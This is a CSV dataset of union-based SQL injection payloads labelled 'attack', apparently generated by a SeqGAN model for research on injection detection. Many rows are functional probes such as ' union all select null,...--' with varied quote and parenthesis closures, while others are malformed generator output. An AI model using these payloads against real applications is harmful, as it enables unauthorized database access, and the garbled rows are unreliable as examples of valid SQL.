label,payload,family,payload_type,method,run_id,sample_index
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1834
attack,1''   )    )    )    )    )    )    )    union all where select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1835
attack," * select * from us where where 98148846,9814,1249,9777--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1836
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1837
attack, select * from ua where  --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1838
attack,"1'  )   union all select 5145,5145,9945 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1839
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1840
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1841
attack,"1'   )    )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1842
attack,"1""   )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1843
attack,"1 union all select null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1844
attack,"1' union all select null,null,null,2132,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1845
attack,"1' union all where null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1846
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1847
attack,"1' union all select null,null,2132,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1848
attack,"1'""       union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1849
attack,"1'   )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1850
attack,"1""   )    )    )    )    )    )    union all where null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1851
attack,1   )    )    )    )    )    )    where 8890  =  )  (  )      =  5870 union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1852
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1853
attack,"1""   )    )    )    )    )    )    where null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1854
attack,"1"" union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1855
attack,"1""   )    )    )    )    )    where 7815  =  8268 union all select null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1856
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1857
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1858
attack,"1""   )    )    )    )    )    )    )     )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1859
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1860
attack,"1'   )    )    )    )    )    )    union all select null,null,null,2132,2334null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1861
attack,"1' union all select  1917,6216,7230,7230,7230,7230#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1862
attack,"1' union all select select 4300,8067,3900,3900,3900,3900,3900,3900,2285#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1863
attack,"1""   )    )    )    )    )    where 1494  =  )      (  (    --'   )    )    )    )    )    )    where null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1864
attack,"1'  )   union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1865
attack,"1' union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1866
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null,null,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1867
attack,"1'""   )    )    )    )    )    )    )    )    where nullaan union "" AND 1  =  0 UNION ALL SELECT ""--)   -- all where 42739945 3900,3900,5087,3900,3900,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1868
attack,1' union all 1494--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1869
attack,"1  )    )    )    )    )    )    union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1870
attack,"1' union select id  (  (    )   --'   )    )   )    )    where 1,@@6039""63491249-- 1443  (    )   --   (    )   -- all where where 1917  (  (    --)   --)    )   --  (    )   -- lwhere 5145 9322,9346,8067,9346,9346,7294#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1871
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1872
attack,"1' union select nulla,1839--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1873
attack,1'  )   -- all where 6700#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1874
attack,"1"")   where null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1875
attack,"1'""   )    )    )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1876
attack,"1""   )    )    )    )    )    where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1877
attack,"1'  )   union all select null,null,null,9988,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1878
attack,"1' union all 1276 8067,1646,3480,3900,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1879
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1880
attack,"1' union all select null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1881
attack,"1' union all select 4300,7294,null,1845,8231,5087,3900,3900,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1882
attack,"1'"" union all where 5925  =  (  1'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1883
attack,1# select union from from where 1917  (    )    )    -- v,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1884
attack,"1""   )    )    )    )    )    )    where 2774  =  3741 union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1885
attack,1'   )    )    )    )    )    union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1886
attack,"1'   )    )    )    )    )    )    )    where null,8890,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1887
attack,"1' union all where null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1888
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1889
attack,"1'""   )    )    )    )    )    )    union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1890
attack,"1'   )    )    )    a)    )    )    iunion all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1891
attack,"1""   )    )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1892
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1893
attack, select * from us where where from from  3705--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1894
attack,"1'  )   union all where 2887,8890,8890#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1895
attack,1'  )   where 1494  (  (    )   -- 1839,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1896
attack,"1' union all select 8067,8067,3900,5087,3900,4273--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1897
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1898
attack,"1 union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1899
attack,"1'  )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1900
attack,"1'   )    )    )    )    )    where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1901
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1902
attack,"1' union all select ,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1903
attack,"1'   )   union all select  null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1904
attack,"1""   )    )    )    )    )    )    union all select select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1905
